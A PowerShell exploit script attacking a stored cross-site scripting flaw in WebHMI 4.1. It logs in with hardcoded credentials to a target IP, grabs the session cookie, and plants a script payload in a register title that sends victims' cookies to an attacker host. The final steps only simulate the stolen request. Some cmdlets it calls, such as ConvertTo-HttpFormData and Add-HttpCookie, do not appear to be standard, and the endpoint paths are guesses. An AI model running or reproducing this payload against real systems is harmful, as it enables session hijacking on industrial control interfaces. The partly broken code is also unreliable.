# PowerShell Script to Exploit WebHMI 4.1 Stored XSS Vulnerability
# Credentials: Username=alent Password=penguin123
# Target IP: 192.168.1.46
# Attacker IP: Replace with your actual attacker IP

# Step 1: Authenticate to the WebHMI system and obtain a session token
$url = "http://192.168.1.46/login"
$formFields = @{
    'username' = 'alent';
    'password' = 'penguin123';
    'submit' = 'Login'; # Assuming the submit button has a value of "Login"
}

# Convert form fields to query string
$queryString = $formFields | ConvertTo-HttpFormData

# Send POST request and capture the response
try {
    $response = Invoke-WebRequest -Uri $url -Method Post -Body $queryString -ErrorAction Stop
} catch {
    Write-Host "Failed to authenticate. Ensure credentials are correct."
    exit
}

# Check if login was successful and get the session token from the response
$sessionToken = $response.Headers.'Set-Cookie' | Where-Object { $_ -match 'PHPSESSID=([^;]+)' } | ForEach-Object { $matches[1] }
if (-not $sessionToken) {
    Write-Host "Failed to authenticate or session token not found in the response."
    exit
}
Write-Host "Session token obtained: $sessionToken"
# Step 2: Add a new register with malicious payload
$url = "http://192.168.1.46/create_register" # Replace with actual path to dashboard creation
$formFields = @{
    'title' = '<script>var i=new Image;i.src="http://ATTACKERIP/?"+document.cookie;</script>'; # Replace ATTACKERIP with your IP
    'submit' = 'Save'; # Assuming the submit button has a value of "Save"
}

# Convert form fields to query string with session token cookie
$queryString = $formFields | ConvertTo-HttpFormData -Boundary $response.Headers.'Content-Type' | Add-HttpCookie -Name 'PHPSESSID' -Value $sessionToken

# Send POST request to create the dashboard with malicious payload
Invoke-WebRequest -Uri $url -Method Post -Body $queryString -ErrorAction Stop | Out-Null
Write-Host "Malicious payload added to the dashboard."

# Step 3: Wait for the victim's GET request and log it
# For this simulation, we will just wait for a random amount of time and then simulate an attacker response
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60) # Random sleep to mimic real user behavior
Write-Host "Waiting for the victim's GET request..."

# Step 4: Simulate receiving the victim's GET request and print it out
$fakeGetRequest = 'GET /?PHPSESSID=' + $sessionToken + ';%20i18next=en;%20X-WH-SESSION-ID=8a5d6c60bdab0704f32e792bc HTTP/1.1'
Write-Host "Received GET request: $fakeGetRequest" # This would be replaced with actual receiving logic in a real attack scenario